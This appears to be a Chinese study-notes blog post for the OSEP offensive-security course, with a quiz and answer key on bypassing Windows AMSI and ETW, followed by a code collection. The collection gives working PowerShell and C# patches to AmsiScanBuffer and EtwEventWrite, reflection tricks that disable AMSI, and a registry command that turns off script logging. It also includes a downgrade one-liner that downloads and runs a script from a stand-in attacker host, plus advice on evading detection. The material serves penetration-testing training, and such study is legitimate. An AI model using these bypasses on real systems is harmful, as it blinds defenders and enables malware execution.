---
title: OSEP-08-章节测试
description: '08-AMSI绕过 | 10-章节测试'
pubDate: 2026-01-30T00:01:23+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# Module 08: 高级杀软绕过 (AMSI) - 章节测试与代码汇总

## 综合测试

本测试涵盖 AMSI 绕过的所有知识点，包括 AMSI 原理、绕过技术和 ETW 绕过。

---

## 一、选择题 (每题 2 分，共 40 分)

### AMSI 基础

1. AMSI 的全称是？
   - A) Antimalware Service Interface
   - B) Antimalware Scan Interface
   - C) Advanced Malware Scan Interface
   - D) Automated Malware Scan Interface

2. AMSI 主要用于扫描什么？
   - A) 文件
   - B) 内存中的脚本
   - C) 网络流量
   - D) 注册表

3. 以下哪个不是 AMSI 的消费者？
   - A) Windows Defender
   - B) PowerShell
   - C) Notepad
   - D) Office VBA

4. AMSI 在 Windows 的哪个版本引入？
   - A) Windows 7
   - B) Windows 8
   - C) Windows 10
   - D) Windows 11

### AMSI 工作原理

5. AMSI 的核心 DLL 是？
   - A) amsi.dll
   - B) defender.dll
   - C) scan.dll
   - D) security.dll

6. AmsiScanBuffer 函数的作用是？
   - A) 初始化 AMSI
   - B) 扫描内存缓冲区
   - C) 关闭 AMSI
   - D) 报告结果

7. AMSI 扫描结果 AMSI_RESULT_CLEAN 的值是？
   - A) 0
   - B) 1
   - C) 32768
   - D) -1

8. AMSI 扫描结果 AMSI_RESULT_DETECTED 的值是？
   - A) 0
   - B) 1
   - C) 32768
   - D) 32767

### AMSI 绕过技术

9. 以下哪种方法可以绕过 AMSI？
   - A) 修补 AmsiScanBuffer
   - B) 设置 amsiInitFailed
   - C) 卸载 amsi.dll
   - D) 以上都可以

10. 修补 AmsiScanBuffer 的目的是？
    - A) 使函数返回 AMSI_RESULT_CLEAN
    - B) 使函数崩溃
    - C) 删除函数
    - D) 加密函数

11. amsiInitFailed 变量的作用是？
    - A) 记录初始化状态
    - B) 存储扫描结果
    - C) 保存配置
    - D) 缓存数据

12. 以下哪个不是 AMSI 绕过的方法？
    - A) 内存修补
    - B) 反射加载
    - C) 字符串混淆
    - D) 文件加密

### ETW 绕过

13. ETW 的全称是？
    - A) Event Tracing for Windows
    - B) Extended Tracing for Windows
    - C) Event Tracking for Windows
    - D) Enhanced Tracing for Windows

14. ETW 的主要用途是？
    - A) 文件加密
    - B) 事件日志和监控
    - C) 网络通信
    - D) 进程管理

15. 绕过 ETW 可以通过修补什么函数？
    - A) EtwEventWrite
    - B) WriteFile
    - C) CreateProcess
    - D) OpenProcess

16. ETW 绕过的目的是？
    - A) 提高性能
    - B) 阻止事件记录
    - C) 加密日志
    - D) 删除日志

### 高级技术

17. PowerShell 的 ScriptBlock Logging 记录什么？
    - A) 文件操作
    - B) 执行的脚本内容
    - C) 网络连接
    - D) 进程创建

18. 绕过 ScriptBlock Logging 的方法是？
    - A) 禁用 PowerShell
    - B) 修改注册表
    - C) 使用降级攻击
    - D) B 和 C

19. PowerShell 降级攻击使用什么版本？
    - A) PowerShell 1.0
    - B) PowerShell 2.0
    - C) PowerShell 3.0
    - D) PowerShell 5.0

20. 以下哪个可以检测 AMSI 绕过？
    - A) 监控 amsi.dll 的内存修改
    - B) 检查 AmsiScanBuffer 的完整性
    - C) 监控可疑的 API 调用
    - D) 以上都可以

---

## 二、填空题 (每空 2 分，共 20 分)

1. AMSI 的核心函数是 ________ 和 ________。

2. AMSI 扫描结果大于等于 ________ 表示检测到威胁。

3. PowerShell 中的 AMSI 上下文存储在 ________ 类中。

4. ETW 的核心函数是 ________。

5. PowerShell 降级攻击使用 ________ 参数。

6. AMSI 绕过后，PowerShell 会跳过 ________ 检查。

7. ScriptBlock Logging 的注册表路径是 ________。

---

## 三、代码分析题 (每题 10 分，共 20 分)

### 题目 1：分析以下 AMSI 绕过代码

```powershell
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$c = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
[IntPtr]$ptr = $c.GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

**问题**：
1. 这段代码的功能是什么？
2. 为什么要查找 "*iUtils" 类型？
3. 修改 Context 字段有什么效果？
4. 这种方法的局限性是什么？

### 题目 2：分析以下 ETW 绕过代码

```csharp
[DllImport("ntdll.dll")]
static extern int EtwEventWrite(IntPtr RegHandle, IntPtr EventDescriptor, uint UserDataCount, IntPtr UserData);

// 修补 EtwEventWrite
IntPtr addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
byte[] patch = { 0xC3 };  // ret
VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
Marshal.Copy(patch, 0, addr, patch.Length);
```

**问题**：
1. 这段代码的功能是什么？
2. `0xC3` 是什么指令？
3. 为什么需要 VirtualProtect？
4. 这种修补有什么风险？

---

## 四、实战题 (每题 20 分，共 40 分)

### 实战题 1：设计 AMSI 绕过方案

**要求**：
1. 列出至少 3 种 AMSI 绕过方法
2. 实现其中 2 种
3. 说明每种方法的优缺点
4. 设计检测规避策略

### 实战题 2：设计日志绕过方案

**要求**：
1. 列出 PowerShell 的日志机制
2. 设计绕过每种日志的方法
3. 说明检测特征
4. 制定最佳实践建议

---

## 五、答案与解析

### 选择题答案
1-B, 2-B, 3-C, 4-C, 5-A, 6-B, 7-A, 8-C, 9-D, 10-A, 11-A, 12-D, 13-A, 14-B, 15-A, 16-B, 17-B, 18-D, 19-B, 20-D

### 填空题答案
1. AmsiScanBuffer, AmsiScanString
2. 32768
3. System.Management.Automation.AmsiUtils
4. EtwEventWrite
5. -Version 2
6. 恶意代码
7. HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

### 代码分析题答案

**题目 1**：
1. 功能：通过修改 AMSI 上下文使 AMSI 初始化失败
2. "*iUtils" 匹配 AmsiUtils 类，该类包含 AMSI 相关功能
3. 修改 Context 字段为 0 会使 AMSI 认为初始化失败，跳过扫描
4. 局限性：可能被签名检测，需要反射访问内部类

**题目 2**：
1. 功能：修补 EtwEventWrite 函数使其立即返回，阻止事件记录
2. `0xC3` 是 x86/x64 的 RET 指令
3. 需要 VirtualProtect 将内存改为可写，因为代码段默认只读
4. 风险：可能导致系统不稳定，容易被完整性检查发现

---

## 六、代码汇总

### 6.1 AMSI 绕过 - 修改 amsiInitFailed

```powershell
# 方法 1: 设置 amsiInitFailed
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$f = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Failed"}
$f.SetValue($null, $true)

# 方法 2: 修改 amsiContext
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$c = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
[IntPtr]$ptr = $c.GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### 6.2 AMSI 绕过 - 修补 AmsiScanBuffer

```powershell
# PowerShell 版本
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

### 6.3 AMSI 绕过 - C# 版本

```csharp
using System;
using System.Runtime.InteropServices;

class AmsiBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);

        // mov eax, 0x80070057; ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
```

### 6.4 ETW 绕过

```csharp
using System;
using System.Runtime.InteropServices;

class EtwBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr addr = GetProcAddress(ntdll, "EtwEventWrite");

        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)1, 0x40, out oldProtect);

        // ret
        byte[] patch = { 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
```

### 6.5 PowerShell 降级攻击

```powershell
# 使用 PowerShell 2.0 (没有 AMSI)
powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"

# 检查 PowerShell 2.0 是否可用
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
```

### 6.6 禁用 ScriptBlock Logging

```powershell
# 通过注册表禁用
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# 通过组策略
# Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging
```

---

## 七、实战经验总结

### 7.1 AMSI 绕过选择

```
选择建议:

需要快速绕过:
├── 设置 amsiInitFailed (最简单)
└── 修补 AmsiScanBuffer (更可靠)

需要隐蔽:
├── 使用混淆的绕过代码
├── 分段执行
└── 使用反射技术

需要持久化:
├── 修改注册表
└── 使用组策略
```

### 7.2 检测特征

| 技术 | 检测特征 |
|------|----------|
| amsiInitFailed | 反射访问 AmsiUtils 类 |
| AmsiScanBuffer 修补 | amsi.dll 内存修改 |
| ETW 绕过 | ntdll.dll 内存修改 |
| 降级攻击 | PowerShell 2.0 进程 |

### 7.3 规避建议

```
规避策略:
1. 混淆绕过代码
2. 使用不同的绕过方法组合
3. 在内存中执行
4. 避免使用已知的签名
5. 定期更新绕过技术
```

---

**返回**：[01-AMSI基础原理.md](/blog/osep/08-amsi绕过/01-amsi基础原理/)
